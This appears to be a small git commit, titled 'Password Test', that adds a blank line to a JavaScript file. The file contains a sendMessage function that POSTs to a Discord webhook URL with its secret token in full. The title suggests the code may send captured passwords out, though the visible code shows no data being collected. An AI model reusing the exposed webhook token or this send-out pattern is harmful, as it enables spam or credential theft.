ec5daec53358fb35c5ff90d0a821c86b389d07e1
TheEndBoss_101 <TheEndBoss101@gmail.com>
2022-04-25 22:14:59 -0500

    Password Test

--- d78ba61ca26d60aac42ce0ad1a0905134487263c/eas_main.js
+++ d78ba61ca26d60aac42ce0ad1a0905134487263c/eas_main.js
@@ -1,4 +1,5 @@
 alert("WARNING: HIGHLY EXPERMENTAL!")
+
 function sendMessage() {
     const request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/965359101926314025/H6RpMxAvESc9GQ3ip-wPVCqxSgeBwknVHaWZSE3v6PiaRmsw7GGBlqkINK7ff12V9M3g");
